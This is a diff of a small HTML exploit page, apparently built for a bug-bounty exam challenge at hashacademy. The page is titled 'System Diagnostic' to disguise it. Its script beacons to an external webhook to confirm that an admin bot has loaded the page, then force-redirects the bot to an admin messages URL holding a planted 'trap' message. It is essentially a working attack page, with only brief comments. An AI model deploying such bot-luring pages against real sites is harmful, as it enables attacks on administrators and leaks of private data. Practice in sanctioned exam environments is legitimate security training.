@@ -1,16 +1,22 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>System Diagnostic</title>
+</head>
 <body>
     <script>
-        // 1. Tell your webhook that the bot reached your hosted file
-        new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2?status=bot_visited_exploit_html";
+        // 1. Immediate Ping to confirm the bot is HERE
+        const webhook = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2";
+        new Image().src = webhook + "?step=exploit_loaded";
 
-        // 2. Redirect to the specific message ID you just created
+        // 2. The Target Message ID
         const trapId = "69e0fec9bee6d6b7c66269cb";
-        
-        setTimeout(() => {
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + trapId;
-        }, 500);
+        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + trapId;
+
+        // 3. Force Redirect
+        // Using location.replace is often better as it doesn't keep the history 
+        // and is usually prioritized by the browser engine.
+        window.location.replace(targetUrl);
     </script>
 </body>
 </html>
